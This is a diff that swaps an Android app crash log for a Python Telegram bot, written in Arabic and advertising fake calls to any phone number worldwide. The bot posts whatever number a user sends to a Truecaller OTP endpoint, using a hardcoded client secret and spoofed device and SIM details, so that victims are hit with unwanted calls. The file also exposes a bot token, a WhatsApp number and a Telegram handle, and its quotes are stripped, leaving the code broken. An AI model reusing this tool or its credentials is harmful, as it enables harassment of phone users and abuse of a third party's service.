@@ -1,31 +1,75 @@
-TAG: 2.12.2(22121091)
-ROOT: false
-ABI: armeabi-v7a
-MODEL: itel A662LM
-SDK: 31
-RELEASE: 12
----StackTrace---
-java.lang.SecurityException: Permission Denial: opening provider androidx.core.content.FileProvider from ProcessRecord{6961706 10479:bin.mt.plus/u0a504} (pid=10479, uid=10504) that is not exported from UID 10483
-	at android.os.Parcel.createExceptionOrNull(Parcel.java:2426)
-	at android.os.Parcel.createException(Parcel.java:2410)
-	at android.os.Parcel.readException(Parcel.java:2393)
-	at android.os.Parcel.readException(Parcel.java:2335)
-	at android.app.IActivityManager$Stub$Proxy.getContentProvider(IActivityManager.java:6440)
-	at android.app.ActivityThread.acquireProvider(ActivityThread.java:7109)
-	at android.app.ContextImpl$ApplicationContentResolver.acquireUnstableProvider(ContextImpl.java:3483)
-	at android.content.ContentResolver.acquireUnstableProvider(ContentResolver.java:2528)
-	at android.content.ContentResolver.openAssetFileDescriptor(ContentResolver.java:1846)
-	at android.content.ContentResolver.openOutputStream(ContentResolver.java:1564)
-	at l.ۛۖۤ.۫(W14W:173)
-	at l.۟ۖۦ.ۡ(UAU2:296)
-	at l.ۤۖۤ.ۡ(L131:22)
-	at l.ۦۧۤ.ۡ(D181:625)
-	at l.ۜۖۦ.ۡ(WB34:119)
-	at l.۫ۧۦ.ۡ(3B3L:1115)
-	at l.۫ۧۦ.ۡ(3B3L:1081)
-	at l.ۡۧۦ.۬(ZB2P:1026)
-	at l.ۙ۟ۥ.ۡ(N4WI:75)
-	at l.ۘ۟ۥ.run(5ATD:185)
-	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
-	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
-	at java.lang.Thread.run(Thread.java:920)
+
+import requests
+import hashlib, random
+import telebot
+from telebot import types
+token = "5424002919:AAEgQDywN1C_3Ab0W8NYZqymVi5UEO13fNs"
+bot = telebot.TeleBot(token)
+
+@bot.message_handler(commands=[ start ])
+def start(message):
+  b = types.InlineKeyboardMarkup()
+  b.add(brok)
+  bot.reply_to(message, اهـــلآ بك في بـــوت طــرزان لارسال مــكالمات مزيفه الا اي رقم في العالم  قم بضغط علا /tarzan•👾\n+ ,reply_markup=b)
+
+
+
+@bot.message_handler(commands=[ Hild ])
+def tarzan(message):
+  b = types.InlineKeyboardMarkup()
+  b.add(brok)
+  bot.reply_to(message, هلاً بك انا هنا لمساعدتك في اي شيئ تحتاجه فقط اطلب ما تحتاجه وسابذل قصاري جهدي لتقديم المساعده سواء كنت تبحث عن معلومات او اجابه اي اسئله او ترغب في الحصول علا توجيه في موضوع معين فانا هنا لخدمتك لا تتردد في طرح اي سؤال او طلب ما تحتاجه ساكون سعيد بتقديم المساعده بافضل ما لدي                                                                            طـــرزان                                                    رقمي وتساب                                                     https://wa.me/966571961318         \n+ ,reply_markup=b)
+
+
+
+
+
+brok=types.InlineKeyboardButton(text=  معرفي تلي جرام  ,url="t.me/amr222tarzan")
+
+@bot.message_handler(commands=[ tarzan ])
+def tarzan(message):
+  b = types.InlineKeyboardMarkup()
+  b.add(brok)
+  bot.reply_to(message, اهــلآ بــك الرسل  الرقم   مع رمز الدوله\n+ ,reply_markup=b)
+
+
+
+
+
+
+
+
+asa =  123456789 
+gigk = str(  .join(random.choice(asa) for i in range(10)))
+
+md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
+
+
+headers = {
+    "Host": "account-asia-south1.truecaller.com",
+    "content-type": "application/json; charset\u003dUTF-8",
+    "content-length": "680",
+    "accept-encoding": "gzip",
+    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
+    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
+  }
+
+url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
+
+
+@bot.message_handler(func=lambda m:True)
+def number(message):
+
+  data =  {"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":" +md5+ ","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":" +message.text+ ","region":"region-2","sequenceNo":1} 
+
+  req = requests.post(url, headers=headers, data=data).text
+
+  bot.reply_to(message, تــم الرسال المكالمه اذاء ارت شي اخر او المساعده قم بضغط /Hild! )
+
+
+
+
+
+
+print( run )
+bot.infinity_polling()
